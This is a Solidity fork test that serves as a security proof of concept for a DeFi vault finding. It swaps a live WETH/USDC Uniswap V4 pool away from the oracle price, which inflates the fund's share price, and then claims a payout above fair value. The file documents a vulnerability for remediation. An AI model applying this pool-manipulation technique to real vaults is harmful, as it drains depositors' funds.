// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {IAdapter} from "../../../src/interfaces/IAdapter.sol";
import {IPriceSource} from "../../../src/interfaces/IPriceSource.sol";
import {EndToEndScenario} from "../e2e/EndToEnd.t.sol";

/// @notice Security proof of concept (docs/security/reports/static-analysis.md, finding SA-01): the hub Uniswap V4
///         position is valued from the token amounts it holds at the pool's spot price (`IAdapter.positionValue`,
///         `slot0`), each priced through the price source (Chainlink for WETH, USDC at par). Those amounts are the
///         cheapest bundle only when the pool trades at the oracle price, so anyone who moves the pool away from it,
///         in either direction, raises Share Assets and the Share Price without adding any value to the fund, and a
///         Payout claimed in that state is paid at the raised price (DEC-067 asks for a guarded pool price, QA3 OPEN).
/// @dev The test passes while the code is exposed; it is a pin of the exposure, not of a rule. It runs on the pinned
///      Arbitrum One fork against the live WETH/USDC 0.05% pool, so it shows the mechanism, not a profit: the fund's
///      position here is 3,000 USDC in a pool with far more liquidity, and the trader's round-trip cost is logged
///      next to the payout surplus. The report gives the sizes at which the surplus exceeds the cost.
contract SpotCompositionInflationForkTest is EndToEndScenario {
    uint256 internal constant PAYOUT = 1000e6;

    int24 internal center;
    uint256 internal assetsFair;
    uint256 internal priceFair;
    uint256 internal assetsDown;
    uint256 internal paidGross;

    function test_POC_forkHubSharePriceFollowsPoolSpotCompositionNotTheOracle() public {
        _createForks();
        _phase1CreateFund();
        _phase2AnaDeposits();
        _phase3HubAllocationAndIncome();

        _onArbitrum();
        center = _center(ARB_V4_STATE_VIEW, ARB_WETH_USDC_POOL_ID);
        assetsFair = core.shareAssets();
        priceFair = core.sharePrice();
        uint256 traderBefore = _traderValue();

        _pushDownAndRead();
        _claimAtTheRaisedPrice();
        _pushUpAndRead();
        _restoreAndRead();

        uint256 traderAfter = _traderValue();
        emit log_named_decimal_uint(
            "Trader round-trip cost at the oracle price (USDC)",
            traderBefore > traderAfter ? traderBefore - traderAfter : 0,
            6
        );
    }

    /// @dev A third party sells WETH into the pool until the price is three half-ranges below the fund's range. Nothing
    ///      reaches a vault and the oracle does not move.
    function _pushDownAndRead() internal {
        IAdapter.PositionValue memory fair = IAdapter(hubUniswap).positionValue(hubUniswapPosition);
        assertGt(fair.principal0, 0, "in range: the position holds WETH");
        assertGt(fair.principal1, 0, "in range: the position holds USDC");
        (uint256 oracleBefore,) = IPriceSource(hubDeployment.priceSource).priceInUsdc(ARB_WETH);

        _swapToTick(arbitrumRouter, _hubPoolKey(), ARB_V4_STATE_VIEW, center - 3 * HALF_RANGE);

        (uint256 oracleAfter,) = IPriceSource(hubDeployment.priceSource).priceInUsdc(ARB_WETH);
        assertEq(oracleAfter, oracleBefore, "the oracle price did not move");
        IAdapter.PositionValue memory pushed = IAdapter(hubUniswap).positionValue(hubUniswapPosition);
        assertEq(pushed.principal1, 0, "out of range below: the position is reported as WETH only");
        assetsDown = core.shareAssets();
        assertGt(assetsDown, assetsFair, "Share Assets rose although no value entered the fund");
        emit log_named_decimal_uint("Share Assets at the oracle price (USDC)", assetsFair, 6);
        emit log_named_decimal_uint("Share Assets with the pool pushed down (USDC)", assetsDown, 6);
    }

    /// @dev A Payout claimed in that state is priced at the raised Share Price and paid from Idle.
    function _claimAtTheRaisedPrice() internal {
        vm.startPrank(ana);
        core.requestPayout(PAYOUT, ICoreVault.PayoutMode.Instant);
        ICoreVault.PayoutReceipt memory receipt = core.claimPayout("");
        vm.stopPrank();
        assertEq(receipt.unwindProceeds, 0, "paid from Free Idle, nothing unwound");
        assertGt(receipt.sharePrice, priceFair, "the claim burned at the raised Share Price");
        uint256 fairGross = receipt.sharesBurned * priceFair / 1e36;
        assertGt(receipt.usdcGross, fairGross, "more USDC left Idle than the burned shares were worth");
        paidGross = receipt.usdcGross;
        emit log_named_decimal_uint("Share Price at the oracle price (USDC)", priceFair, 24);
        emit log_named_decimal_uint("Share Price the claim burned at (USDC)", receipt.sharePrice, 24);
        emit log_named_decimal_uint("Paid above the fair value of the burned shares (USDC)", paidGross - fairGross, 6);
    }

    /// @dev The same happens above the range: the position is reported as USDC only, again above its fair value.
    function _pushUpAndRead() internal {
        _swapToTick(arbitrumRouter, _hubPoolKey(), ARB_V4_STATE_VIEW, center + 3 * HALF_RANGE);
        IAdapter.PositionValue memory lifted = IAdapter(hubUniswap).positionValue(hubUniswapPosition);
        assertEq(lifted.principal0, 0, "out of range above: the position is reported as USDC only");
        uint256 assetsUp = core.shareAssets() + paidGross;
        assertGt(assetsUp, assetsFair, "Share Assets are above fair in this direction too");
        emit log_named_decimal_uint("Share Assets with the pool pushed up, payout added back (USDC)", assetsUp, 6);
    }

    /// @dev Back at the starting price the valuation returns to fair, less what the payout took out.
    function _restoreAndRead() internal {
        _swapToTick(arbitrumRouter, _hubPoolKey(), ARB_V4_STATE_VIEW, center);
        uint256 assetsRestored = core.shareAssets() + paidGross;
        assertLt(assetsRestored, assetsDown, "the raise was the pool price, not value");
        emit log_named_decimal_uint("Share Assets with the pool restored, payout added back (USDC)", assetsRestored, 6);
    }

    /// @dev The trader's WETH and USDC at the oracle price.
    function _traderValue() internal view returns (uint256) {
        return IERC20(ARB_USDC).balanceOf(trader) + _usdcValue(ARB_WETH, IERC20(ARB_WETH).balanceOf(trader));
    }
}
